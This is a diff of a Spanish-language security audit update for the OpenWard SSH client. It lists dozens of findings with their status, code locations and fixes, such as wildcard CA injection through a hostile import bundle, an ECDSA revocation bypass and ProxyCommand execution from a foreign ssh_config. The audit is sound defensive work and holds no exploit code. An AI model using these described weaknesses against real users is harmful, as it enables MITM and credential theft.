-- **Qué pasa:** la 0.7.6, que llegó con R5 por RUSTSEC-2026-0387, está retirada, igual que la 0.7.7 y la 0.7.8. La política de `deny.toml` hace fallar la puerta, que es lo que BR-1 quería evitar.
-- **Recomendación:** `cargo update -p crypto-bigint` (0.7.9 o 0.7.10) y `make deny`.
-
-### CI-10 · Los PRs de forks producen artefactos con nombre de release
-- **Gravedad:** Baja · **Confianza:** Confirmado
-- **Ubicación:** `.github/workflows/ci.yml:12,292-320`.
-- **Qué pasa:** con el repositorio público, cualquier PR de un fork deja `OpenWard-<versión>-linux-x64.tar.gz` en un artefacto `OpenWard-Linux` de una ejecución de `KaiCorpLabs/openward`: un buen gancho para «descarga la build arreglada de este run».
-- **Recomendación:** no empaquetar en `pull_request`, o nombrar `pr-<n>-…` y bajar la retención.
-
-### CI-11 · Los paquetes de Linux no tienen las garantías de BR-4 ni sumas
-- **Gravedad:** Baja · **Confianza:** Confirmado
-- **Ubicación:** `app/tool/package-linux.sh:115-120,136-139`.
-- **Qué pasa:** un árbol sucio o fuera del tag solo cambia de nombre (`+commit-dirty`), no se rechaza; no hay `.commit` ni sha256 junto al paquete; las releases no llevan `SHA256SUMS` ni atestación de procedencia.
-- **Recomendación:** las comprobaciones de `package-macos.sh:33-46`, un `SHA256SUMS` por release y `actions/attest-build-provenance` cuando los construya la CI.
-- **Relación:** BR-4 (solo macOS) y BR-10.
-
-### CI-12 · Informativos de build y publicación
-- **Gravedad:** Informativa
-- **Datos personales en el historial:** los commits y tags anotados del mantenedor llevan su correo personal como autor, y ninguno va firmado. Al publicar el repositorio quedará expuesto, y solo se cambia reescribiendo los SHA: decidirlo antes, usar el correo `noreply` para lo que venga y firmar los tags de release.
-- **macOS sin Hardened Runtime** (`app/macos/Runner.xcodeproj/project.pbxproj`): `DYLD_INSERT_LIBRARIES` funciona y lo inyectado heredaría los permisos de TCC de OpenWard; pide ser el mismo usuario. Al firmar, `-o runtime` sin `disable-library-validation`, `allow-unsigned-executable-memory` ni `allow-jit` en Release (`allow-jit` ya solo está en `DebugProfile.entitlements`).
-- **`subosito/flutter-action`** (fijada por SHA) usa por dentro `actions/cache@v5` por tag y baja el SDK de Flutter sin comprobar su SHA-256.
-- **`.gitignore`:** no ignora los datos de la app si `OPENWARD_DATA` apunta dentro del repositorio (`vault.db`, `logs/*.cast.gz`, `settings.json`); `!core/crates/openward-import/tests/fixtures/**` anula los patrones de secretos dentro de esa carpeta; faltan `*.p8`, `*.cer`, `*.mobileprovision`, `*.provisionprofile` y `cargokit_options.yaml`.
-- **Imágenes de prueba y spikes:** las bases de los servidores S2 van por tag, dependabot no tiene ecosistema `docker`, y el `Cargo.lock` de `spikes/s2-ssh/sshprobe` sigue con RUSTSEC-2026-0385, RUSTSEC-2026-0387 y RUSTSEC-2026-0386 (tokio). No se distribuye nada de eso.
-
-## Comprobado que está bien
-
-Para que conste qué se miró, con la defensa que lo sostiene:
-
-- **Conexión:** la clave del host se verifica al final del intercambio y antes de `authenticate` (`connect.rs:247-258`); cada salto con su `KnownHosts` y el nombre configurado (`connect.rs:217-237`, `client.rs:603-615`); `Changed`, `Revoked` y `BadCertificate` nunca se aceptan, `OtherType` pregunta también con «Aceptar nuevas» (`connect.rs:279-290`); certificados: tipo host, CA limitada a su patrón, validez y principales (`known_hosts.rs:286-334`); cada respuesta a su pregunta por id y sin respuesta es cancelar (`events.rs:420-450`); `HostKeyChanged` no se reintenta (`lib.rs:172-205`).
-- **ProxyCommand y órdenes en el servidor:** `shell_safe` cubre comillas, `` ` $ \ ; & | < > ( ) { } ^ % ! * ? [ ] ~ # ``, espacios Unicode, controles y el `-` inicial (`local.rs:87-160`); tmux y os-release son constantes o un nombre generado (`lib.rs:686-714`, `system.rs:14`), con `exec_short` a 64 KiB.
-- **Algoritmos y canales:** russh 0.64.1 sin `none`, CBC, MAC SHA-1 ni grupo 1, GEX desde 3072 bits y strict KEX; el agente solo al último salto; `forwarded-tcpip` solo a puertos registrados (`client.rs:311-342`); túneles en loopback de serie (`tunnels.rs:156-179`); ni X11 ni `SendEnv`; el proxy lee con límites (`proxy.rs:20-216`).
-- **Terminal:** `engine.rs:309-395` no activa el informe del título, DECRQCRA, el portapapeles (OSC 52, 1337, 5522), notificaciones, ENQ ni PWD; XTGETTCAP responde un mapa fijo; el pegado cambia los controles por espacios (`paste.zig:54-98`) y `encode_text` descarta los C0 (`input.rs:283-306`); enlaces con modificador y lista de esquemas (`terminal_pane.dart:742-763`, `links.dart:16`); el título del programa solo en terminales locales (`controller.dart:155-159`); frames acotados y un frame malo pide uno entero (`frame.rs:189-195`, `frame.dart:182-203`); `unsafe` correcto en `openward-ghostty` (`engine.rs:207,1314-1328`) y `openward-pty` (`lib.rs:254-261`).
-- **Importadores:** `Match` distinto de `all` no se evalúa, así que `Match exec` no ejecuta nada (`ssh_config.rs:430-438`); `LocalCommand`, `KnownHostsCommand` y `RemoteCommand` no se importan; `StrictHostKeyChecking no` pasa a «Aceptar nuevas» con aviso; el ProxyCommand y los comandos al conectar de otros programas solo van al informe; quick-xml no expande DTD (sin XXE ni billion laughs); lecturas de archivos normales de hasta 64 MiB (`files.rs:11-33`).
-- **Claves y vault:** nombres de clave nuevos limitados a `[A-Za-z0-9._@-]` (`keychain.rs:209-226`); borrar, renombrar y cambiar la frase solo dentro de `~/.ssh` (`keychain.rs:230-236`); claves nuevas con `create_new` y 0600; cambio de frase con temporal 0600 y `Zeroizing`; RSA de 4096; la clave pública se instala por SFTP, sin shell; todas las consultas SQL con parámetros; `vault.db`, `-wal`, `-shm` y el candado en 0600; las funciones de prueba de la FFI se niegan en release (`app.rs:168-177`).
-- **SFTP y terminal local:** `is_name` en `read_dir` (`lib.rs:96-98`, `remote.rs:129`) y `local_join` en todas las bajadas (`transfer.rs:827-837`); los gemelos de mayúsculas en serie; un enlace remoto a carpeta no se sigue; los `.part` con id del origen y cancelar solo borra los propios; las bajadas nunca abren ni ejecutan nada; el hijo del PTY sin descriptores del vault ni sockets (`CLOEXEC` y `close_random_fds`), con `setsid` y `TIOCSCTTY`.
-- **Registros:** solo `ChannelMsg::Data`/`ExtendedData` y la salida del PTY (`terminal.rs:203-212,780`); lo tecleado va por `send()`, que no toca el registro; el seguidor de línea descarta prompts de contraseña y lo que no se ve; carpeta fija (`lib.rs:80`), 0700, y archivos con `O_CREAT` 0600; la FFI por el mapa `entries`, sin rutas; solo se borran `{id}.cast.gz`, `{id}.txt.gz` y `{id}.json`; el reproductor tira las respuestas (`terminal.rs:215-218`).
-- **CI y cadena de suministro:** sin `pull_request_target`, `workflow_run` ni `issue_comment`; `contents: read` de serie; ninguna expresión `${{ }}` dentro de `run:`; las acciones fijadas por SHA coinciden con sus tags; Zig en la CI con SHA-256 (`install-zig.sh:6-30`); Ghostty por commit de 40 caracteres y sus dependencias con `.hash`; `Cargo.lock` solo con crates.io (`unknown-git = "deny"`); sin binarios precompilados en `cargokit.yaml`; ningún esquema de URL ni tipo de documento registrado, y los argumentos de línea de órdenes no se usan; BR-4 sigue en `package-macos.sh:33-46`.
-- **Secretos:** ninguna clave privada, token, `.env` ni certificado real en los 2457 blobs del historial; los marcadores `BEGIN OPENSSH PRIVATE KEY` son código o datos falsos de prueba; las claves de los servidores S2 se generan al vuelo fuera del repositorio y sus puertos solo escuchan en 127.0.0.1; los vaults de prueba solo tienen datos inventados (example.com, 10.0.0.x).
+Revisión del **11 de noviembre de 2026** de los 63 puntos de la [PR #8](https://github.com/KaiCorpLabs/openward/pull/8), frente a [main `35ab7a6`](https://github.com/KaiCorpLabs/openward/commit/35ab7a63187a58aae132a31bd000ab0858164dff). Se conserva cada ID y su orden. La [versión original del informe](https://github.com/KaiCorpLabs/openward/blob/377492780338bfd120c85b55a4d15efae20d9263/docs/plan/seguridad-0.3.3.md) examinaba `b6b0012` (0.3.3-beta.2); sus estados y cifras ya no describen por sí solos main.
+
+Este documento actualiza la evaluación y el trabajo pendiente. **Fusionar esta PR documental no corrige los problemas de producto que siguen abiertos ni certifica que la aplicación sea segura.**
+
+## Resultado y alcance
+
+| Dictamen actual | Puntos | Significado |
+|---|---:|---|
+| Confirmado por evidencia estática | **25** | Hay un recorrido y una consecuencia dentro del alcance admitido, con las condiciones descritas en la ficha. No implica reproducción nueva. |
+| Necesita revisión | **20** | Falta un hecho concreto de plataforma, permisos, comportamiento o contrato que podría cambiar el resultado. |
+| No accionable en el alcance actual | **18** | Hay una defensa efectiva, una ruta todavía inactiva, un comportamiento deliberado o una exclusión explícita del modelo. **No significa que todos estén corregidos.** |
+| Total de entradas originales | **63** | No se han añadido hallazgos de una búsqueda nueva ni fusionado entradas parecidas. |
+
+Se aplica [SECURITY.md](../../SECURITY.md), única política encontrada al resolver las 66 rutas citadas, junto con el [modelo de amenazas](../THREAT_MODEL.md). Este contempla archivos importados hostiles, servidores SSH hostiles, otros usuarios del equipo y cadena de suministro. Excluye malware/programas del mismo UID, administradores y la denegación de servicio o llenado de disco por el servidor remoto. Una importación hostil que bloquea la aplicación sigue siendo un caso distinto de esa última exclusión.
+
+La revisión se ha limitado a leer código, configuración, dependencias fijadas y estado de GitHub. No se han ejecutado aplicaciones, builds, pruebas de seguridad ni PoCs como parte del contraste. Las nueve pruebas externas citadas por el informe original son **evidencia histórica**, no pruebas repetidas ni incorporadas a este repositorio. Tampoco se repite su búsqueda de secretos por todo el historial ni se certifica ausencia de secretos.
+
+La gravedad mostrada en cada ficha es la **del informe de entrada**, para conservar trazabilidad; no se arrastran sus totales antiguos como una medición actual. C1…C25 y R1…R20 ordenan por explotabilidad relativa las colas de confirmados y de revisión, por separado; no son una puntuación CVSS.
+
+## Cambios que alteran el diagnóstico
+
+- **IM-2 está corregido en la ruta de importación del producto.** `hold_back` desactiva el forwarding de agente importado en hosts y grupos, y avisa.
+- **IM-1 está mitigado parcialmente.** Ya se retiran binds fuera de loopback, pero `autostart` permanece y un túnel remoto puede exponer un servicio local.
+- **DA-1 ya no describe el caso normal.** La carpeta se crea/endurece a 0700; queda por resolver la garantía si falla `chmod` o no es del usuario.
+- **SF-8 y TE-1 tienen defensas nuevas.** Abrir un archivo remoto pasa por controles específicos, y U+2028/U+2029 ya se representan en el texto visible. Persisten las diferencias de la descarga ordinaria y la vista previa truncada.
+- **CO-4 no queda resuelto por el arreglo reciente de ECDSA.** El cambio de escalares privados no normaliza la comparación de puntos públicos comprimidos en revocación.
+- **CI-2 y CI-9 han cambiado.** Hay CI alojada en tres sistemas; core utiliza `crypto-bigint 0.7.10`. El repositorio ya es público.
+- **CI-3 sigue vigente por una razón comprobada distinta:** el reporte privado de vulnerabilidades está desactivado (`enabled=false`, consulta autenticada de GitHub del 11-11-2026).
+
+## Plan de remediación actualizado S0–S3
+
+Las prioridades son de trabajo posterior; esta PR no modifica el runtime ni activa ajustes administrativos.
+
+| Etapa | Trabajo | Condición para darlo por terminado |
+|---|---|---|
+| **S0 — confianza e importación** | CO-1, IM-1, IM-3, IM-4, DA-3, DA-4; habilitar un canal privado utilizable (CI-3) | Ningún archivo ajeno amplía autoridades, habilita túneles/comandos o añade claves sin consentimiento sobre el contenido y alcance efectivos. |
+| **S0 — escritura y envío de archivos** | SF-1, SF-5 | Descarga anclada al destino, sin seguir enlaces locales preparados por otro usuario; subida confinada a la selección o enlaces autorizados explícitamente. |
+| **S1 — política SSH y permisos** | CO-3…CO-6, SF-2, SF-3, SF-9; resolver CO-2 y DA-1 | Algoritmo recibido sujeto a la política; revocación canónica; rotación y fallos de persistencia seguros; permisos aplicados al objeto correcto. |
+| **S1 — consentimiento e historial** | RG-1, RG-7, RG-8, TE-1 | Exclusión de historial consistente; texto/origen revisables antes de reenviar; borrado que incluya residuos administrados; pegado completo revisable. |
+| **S2 — presupuestos de entrada y build** | IM-5, IM-6, DA-7, CI-1, CI-7 | Importación/lectura acotadas y herramientas/resolución de build ligadas a contenido revisado. |
+| **S2 — hechos pendientes** | Las 20 fichas «Necesita revisión» | Obtener el dato mínimo indicado y convertir cada caso en confirmado o descartado con evidencia; no cerrar por ausencia de una PoC. |
+| **S3 — D3/D6 y distribución** | DA-2, DA-5, RG-4, CI-4…CI-6, CI-8, CI-10…CI-12 y demás deuda documentada | Preparar migraciones y manejo de secretos, acordar la puerta de publicación, aislar builds y verificar procedencia antes de ampliar garantías. |
+
+## Fichas contrastadas
+
+### Conexión y confianza SSH
+
+#### CO-1 · Autoridad global de hosts introducida por una importación
+
+**Confirmado · Vigente** · **Prioridad C1**. Gravedad original: Media.
+
+Un bundle puede conservar un marcador @cert-authority y el patrón *. El importador persiste todos los known hosts, incluso al seleccionar solo algunos hosts; la comprobación posterior usa esas autoridades.
+
+- **Condiciones e impacto:** Importación de un bundle controlado por un tercero; Conexión posterior a un host cubierto por el patrón. Confianza SSH ampliada silenciosamente; posible MITM y entrega de credenciales.
+- **Controles y límites:** La validación rechaza espacios y saltos en campos, pero no impide el marcador ni limita la autoridad al host elegido.
+- **Pendiente de prueba/contexto:** El impacto requiere importar el bundle y después conectar con un servidor cuya clave certifique esa CA; no se ha repetido la PoC histórica.
+- **Siguiente paso:** Separar claves de host y autoridades; exigir consentimiento explícito, mostrar alcance y limitar las entradas a la selección importada.
+- **Evidencia en main:** [core/crates/openward-proto/src/lib.rs:437-467](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-proto/src/lib.rs#L437-L467); [core/crates/openward-app/src/programs.rs:784-814](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-app/src/programs.rs#L784-L814); [core/crates/openward-ssh/src/known_hosts.rs:286-320](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-ssh/src/known_hosts.rs#L286-L320).
+
+#### CO-2 · ACL del known_hosts global en Windows
+
+**Necesita revisión · Pendiente de plataforma** · **Prioridad R1**. Gravedad original: Media.
+
+Se lee PROGRAMDATA/ssh/ssh_known_hosts sin verificar propietario ni DACL.
+
+- **Condiciones e impacto:** Windows; Otro usuario puede modificar la ruta global. Posible modificación de la confianza SSH entre usuarios.
+- **Controles y límites:** La ruta global puede estar protegida por el sistema o el instalador. Leerla no demuestra que un usuario distinto pueda escribirla.
+- **Pendiente de prueba/contexto:** Falta comprobar creación, propietario y DACL en Windows con una cuenta estándar y con OpenSSH instalado/no instalado.
+- **Siguiente paso:** Documentar y verificar la propiedad de esa ruta; rechazar confianza global si su escritura no está restringida.
+- **Evidencia en main:** [core/crates/openward-app/src/local.rs:40-47](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-app/src/local.rs#L40-L47); [core/crates/openward-app/src/connect.rs:168-175](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-app/src/connect.rs#L168-L175).
+
+#### CO-3 · La firma RSA recibida no queda ligada a la política legacy
+
+**Confirmado · Vigente** · **Prioridad C13**. Gravedad original: Baja.
+
+host_key_order excluye ssh-rsa/SHA-1 al desactivar legacy, pero el tratamiento de la clave no comprueba el hash recibido. russh 0.64.1 verifica la firma decodificada sin compararla con el algoritmo negociado; su ssh-key activa sha1.
+
+- **Condiciones e impacto:** Servidor que usa una clave RSA aceptada; Firma ssh-rsa recibida con legacy desactivado. Aceptación de un algoritmo que la configuración pretende deshabilitar.
+- **Controles y límites:** No permite falsificar por sí solo una firma RSA ni omite la comprobación de confianza de la clave.
+- **Pendiente de prueba/contexto:** No se ha repetido el intercambio de red histórico; el alcance confirmado es la falta de aplicación de la política de algoritmo.
+- **Siguiente paso:** Comprobar el algoritmo de la firma frente al negociado y a legacy_host_keys, incluidos certificados; cubrir el rechazo de SHA-1.
+- **Evidencia en main:** [core/crates/openward-ssh/src/client.rs:230-291](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-ssh/src/client.rs#L230-L291); [core/crates/openward-ssh/src/client.rs:552-564](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-ssh/src/client.rs#L552-L564).
+
+#### CO-4 · Una codificación ECDSA equivalente evade la comparación de revocación
+
+**Confirmado · Vigente** · **Prioridad C10**. Gravedad original: Baja.
+
+La revocación compara KeyData por igualdad. ssh-key 0.7.0-rc.11 conserva EncodedPoint comprimido o sin comprimir, aunque ambos representan el mismo punto al verificar firmas.
+
+- **Condiciones e impacto:** Clave ECDSA revocada; El servidor presenta la misma clave con otra codificación y satisface otra ruta de confianza. La revocación puede no reconocer una clave equivalente.
+- **Controles y límites:** El cambio reciente del decodificador de escalares de claves privadas no normaliza las claves públicas usadas por known_hosts.
+- **Pendiente de prueba/contexto:** La PoC de conexión no se ha repetido; la igualdad por representación y la aceptación de ambos formatos se observan en el código fijado.
+- **Siguiente paso:** Comparar una representación canónica del punto público en confianza y revocación, sin alterar los controles de firma.
+- **Evidencia en main:** [core/crates/openward-ssh/src/known_hosts.rs:248-269](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-ssh/src/known_hosts.rs#L248-L269).
+
+#### CO-5 · La rotación no elimina todas las entradas de confianza anteriores
+
+**Confirmado · Vigente** · **Prioridad C11**. Gravedad original: Baja.
+
+trust_host_key elimina solo el host literal y algoritmo coincidentes, sin retirar equivalentes por patrón, hash o diferencias de representación. El comprobador admite cualquiera de las claves coincidentes.
+
+- **Condiciones e impacto:** Rotación de una clave; Otra entrada coincidente conserva la clave anterior. La clave antigua puede seguir autenticando al servidor tras la rotación.
+- **Controles y límites:** Retirar una entrada literal sí funciona; algunas entradas también proceden de archivos externos que el vault no debe modificar sin consentimiento.
+- **Pendiente de prueba/contexto:** El riesgo depende de que permanezca una entrada antigua que también cubra el destino.
+- **Siguiente paso:** Definir la semántica de sustituir/revocar una clave y advertir de las fuentes de confianza residuales antes de confirmar la rotación.
+- **Evidencia en main:** [core/crates/openward-vault/src/lib.rs:738-778](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-vault/src/lib.rs#L738-L778); [core/crates/openward-ssh/src/known_hosts.rs:248-280](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-ssh/src/known_hosts.rs#L248-L280).
+
+#### CO-6 · El fallo al guardar una clave aceptada permite un nuevo TOFU al reconectar
+
+**Confirmado · Vigente** · **Prioridad C12**. Gravedad original: Baja.
+
+La rama AcceptNew continúa aunque vault.trust_host_key falle; la siguiente conexión reconstruye la confianza desde el almacenamiento y no recuerda esa aceptación.
+
+- **Condiciones e impacto:** Política Aceptar nuevas; Fallo al persistir la clave; Otra conexión con una clave distinta. Repetición silenciosa de la confianza inicial en lugar de fijar la primera clave.
+- **Controles y límites:** Exige fallo de persistencia y otra conexión; las claves ya guardadas mantienen sus controles de Changed/Revoked.
+- **Pendiente de prueba/contexto:** No se ha provocado un fallo de disco en esta revisión.
+- **Siguiente paso:** Propagar el fallo de guardado o mantener un pin de sesión explícito y advertir antes de volver a aceptar otra clave.
+- **Evidencia en main:** [core/crates/openward-app/src/connect.rs:259-265](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-app/src/connect.rs#L259-L265); [core/crates/openward-app/src/connect.rs:319-334](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-app/src/connect.rs#L319-L334).
+
+#### CO-7 · Canal del agente en conexiones sin solicitud de forwarding de sesión
+
+**Necesita revisión · Alcance por precisar** · **Prioridad R3**. Gravedad original: Baja.
+
+El handler admite canales de agente cuando existe el socket configurado, sin registrar que esa sesión solicitara forwarding; la configuración también llega a conexiones usadas para SFTP.
+
+- **Condiciones e impacto:** Forwarding del agente habilitado para el host; Servidor solicita el canal fuera de una sesión que lo pidió. Posible acceso al agente más amplio que la autorización de la sesión.
+- **Controles y límites:** forward_agent es opt-in del operador y solo se entrega al último salto. Reutilizar una conexión con forwarding autorizado puede ser intencionado.
+- **Pendiente de prueba/contexto:** Falta definir si la autorización del host cubre toda conexión o únicamente la sesión terminal que lo solicitó.
+- **Siguiente paso:** Precisar el contrato y ligar la aceptación del canal a una solicitud autorizada si el alcance es por sesión.
+- **Evidencia en main:** [core/crates/openward-app/src/connect.rs:270-278](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-app/src/connect.rs#L270-L278); [core/crates/openward-ssh/src/client.rs:344-360](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-ssh/src/client.rs#L344-L360).
+
+#### CO-8 · Preguntas keyboard-interactive con identidad remota poco diferenciada
+
+**Necesita revisión · Pendiente de UX** · **Prioridad R10**. Gravedad original: Baja.
+
+El servidor controla título, instrucciones y preguntas mostradas en la tarjeta.
+
+- **Condiciones e impacto:** Servidor SSH hostil; El usuario interpreta la pregunta como local. Posible entrega de un secreto ajeno a esa autenticación.
+- **Controles y límites:** La tarjeta también muestra usuario y host. No existe todavía el diálogo de desbloqueo del vault cifrado que presupone parte del escenario futuro.
+- **Pendiente de prueba/contexto:** Falta validar que la presentación permite confundir una pregunta remota con una solicitud local en el flujo actual.
+- **Siguiente paso:** Marcar siempre el origen remoto y separar visualmente autenticación SSH y cualquier futuro desbloqueo local.
+- **Evidencia en main:** [app/lib/tabs/prompt_card.dart:60-74](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/lib/tabs/prompt_card.dart#L60-L74); [app/lib/tabs/prompt_card.dart:157-171](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/lib/tabs/prompt_card.dart#L157-L171).
+
+#### CO-9 · Otros controles de conexión pendientes de contraste
+
+**Necesita revisión · Observaciones mixtas** · **Prioridad R11**. Gravedad original: Informativa.
+
+Se conservan las observaciones sobre canales descartados por los handlers por defecto, opciones críticas de certificados, strict KEX/Terrapin, loopback multiusuario, proxies Basic/SOCKS y oferta de identidades. El CONNECT interpola host sin validar CR/LF.
+
+- **Condiciones e impacto:** Configuraciones de certificados, proxy o entorno local específicas. Riesgos condicionados de interpretación y alcance de confianza.
+- **Controles y límites:** Los canales por defecto no conectan a un recurso local; strict KEX está habilitado; Basic/SOCKS y ofrecer claves del agente forman parte del transporte/configuración elegidos.
+- **Pendiente de prueba/contexto:** Faltan un certificado con opción crítica relevante y un caso de proxy que demuestren el efecto de las entradas, además del modelo de exposición de loopback.
+- **Siguiente paso:** Revisar por separado opciones críticas y framing de CONNECT; mantener los demás puntos como límites documentados, sin atribuirles una explotación conjunta.
+- **Evidencia en main:** [core/crates/openward-ssh/src/known_hosts.rs:312-320](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-ssh/src/known_hosts.rs#L312-L320); [core/crates/openward-ssh/src/proxy.rs:85-102](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-ssh/src/proxy.rs#L85-L102).
+
+### Importadores
+
+#### IM-1 · Los túneles importados conservan autostart
+
+**Confirmado · Mitigación parcial** · **Prioridad C3**. Gravedad original: Media.
+
+hold_back elimina binds no loopback, pero no modifica autostart. Un túnel remoto importado puede exponer automáticamente un servicio local al servidor al conectar.
+
+- **Condiciones e impacto:** Importación de túneles controlados por un tercero; Conexión al host importado; Servicio local alcanzable desde el túnel. Exposición no consentida de servicios locales.
+- **Controles y límites:** La exposición por bind 0.0.0.0 de la versión inicial está mitigada. Eso no neutraliza los túneles remotos ni el arranque automático.
+- **Pendiente de prueba/contexto:** No se han abierto túneles de prueba; la configuración y su persistencia siguen trazables en código.
+- **Siguiente paso:** Importar todos los túneles desactivados y mostrar dirección, destino y arranque antes de habilitarlos.
+- **Evidencia en main:** [core/crates/openward-import/src/bundle.rs:298-328](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-import/src/bundle.rs#L298-L328); [core/crates/openward-import/src/detect.rs:135-138](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-import/src/detect.rs#L135-L138); [core/crates/openward-app/src/programs.rs:739-768](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-app/src/programs.rs#L739-L768).
+
+#### IM-2 · El forwarding de agente importado se retiene desactivado
+
+**No accionable en el alcance actual · Corregido en la ruta de producto**. Gravedad original: Baja.
+
+El paso común de importación transforma forward_agent=true en None tanto en grupos como en hosts y añade aviso.
+
+- **Condiciones e impacto:** Ruta de importación utilizada por la aplicación. La activación silenciosa descrita inicialmente ya está bloqueada.
+- **Controles y límites:** No elimina una configuración de forwarding que el operador ya hubiera autorizado por otra vía; esa herencia no procede del archivo importado.
+- **Pendiente de prueba/contexto:** No se han ejecutado pruebas nuevas de importación.
+- **Siguiente paso:** Mantener este control común y su cobertura; no reabrir el caso solo porque existan lectores internos de formato.
+- **Evidencia en main:** [core/crates/openward-import/src/bundle.rs:298-313](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-import/src/bundle.rs#L298-L313); [core/crates/openward-import/src/detect.rs:135-138](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-import/src/detect.rs#L135-L138).
+
+#### IM-3 · ProxyCommand de un ssh_config ajeno llega activo sin vista previa suficiente
+
+**Confirmado · Vigente** · **Prioridad C5**. Gravedad original: Baja.
+
+El lector admite ProxyCommand y el flujo de importación de un archivo seleccionado conserva esa configuración sin una confirmación que muestre la orden completa.
+
+- **Condiciones e impacto:** Importación de un ssh_config ajeno; Conexión posterior al host. Ejecución local de la orden configurada por el archivo.
+- **Controles y límites:** El ssh_config propio del operador es configuración confiable según el modelo; el caso es un archivo ajeno elegido para importar. Los comandos de otros formatos se retienen como avisos.
+- **Pendiente de prueba/contexto:** Exige conectar al host importado; no se ha ejecutado una orden de prueba.
+- **Siguiente paso:** Retener ProxyCommand de archivos ajenos como dato inactivo hasta una autorización explícita que muestre la orden.
+- **Evidencia en main:** [core/crates/openward-import/src/ssh_config.rs:430-449](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-import/src/ssh_config.rs#L430-L449); [core/crates/openward-app/src/programs.rs:739-768](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-app/src/programs.rs#L739-L768); [app/lib/import/programs.dart:39-51](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/lib/import/programs.dart#L39-L51).
+
+#### IM-4 · Snippets importados y ejecución con contenido fuera de la vista previa
+
+**Confirmado · Vigente** · **Prioridad C9**. Gravedad original: Baja.
+
+Se importan todos los snippets. La paleta muestra su primera línea; una ejecución simple no exige revisar el resto ni distingue su origen importado.
+
+- **Condiciones e impacto:** Snippet de un archivo ajeno; Selección posterior en la paleta. Ejecución de órdenes adicionales que no aparecen en la vista previa.
+- **Controles y límites:** No se ejecutan todos al importar: el usuario debe seleccionar un snippet. La elección pierde valor si el contenido ejecutado queda oculto.
+- **Pendiente de prueba/contexto:** No se ha ejecutado ningún snippet.
+- **Siguiente paso:** Seleccionar los snippets a importar y exigir una primera revisión completa antes de ejecutar contenido importado.
+- **Evidencia en main:** [core/crates/openward-app/src/programs.rs:772-782](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-app/src/programs.rs#L772-L782); [core/crates/openward-import/src/termius/model.rs:458-467](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-import/src/termius/model.rs#L458-L467); [app/lib/palette/command_palette.dart:517-527](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/lib/palette/command_palette.dart#L517-L527).
+
+#### IM-5 · Amplificación de memoria al interpretar datos de Termius
+
+**Confirmado · Vigente** · **Prioridad C20**. Gravedad original: Baja (la app se cae).
+
+Referencias V8 clonadas en profundidad, arrays dispersos y acumulación de bloques LevelDB permiten que datos pequeños provoquen mucho más trabajo y memoria que su tamaño de entrada.
+
+- **Condiciones e impacto:** Importación de un directorio Termius preparado. Agotamiento de memoria de la aplicación durante una importación.
+- **Controles y límites:** Existen límites de 64 MiB y profundidad, pero son por archivo/bloque y no un presupuesto de objetos, clonaciones y resultado total.
+- **Pendiente de prueba/contexto:** No se repiten las medidas de memoria o caída de la PoC original.
+- **Siguiente paso:** Aplicar presupuestos globales de objetos, elementos, bytes expandidos y trabajo; evitar clonar grafos completos al resolver referencias.
+- **Evidencia en main:** [core/crates/openward-import/src/termius/v8.rs:143-191](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-import/src/termius/v8.rs#L143-L191); [core/crates/openward-import/src/termius/leveldb.rs:197-265](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-import/src/termius/leveldb.rs#L197-L265).
+
+#### IM-6 · Include y lecturas de confianza sin presupuesto total de trabajo
+
+**Confirmado · Vigente** · **Prioridad C21**. Gravedad original: Baja (la app se cuelga).
+
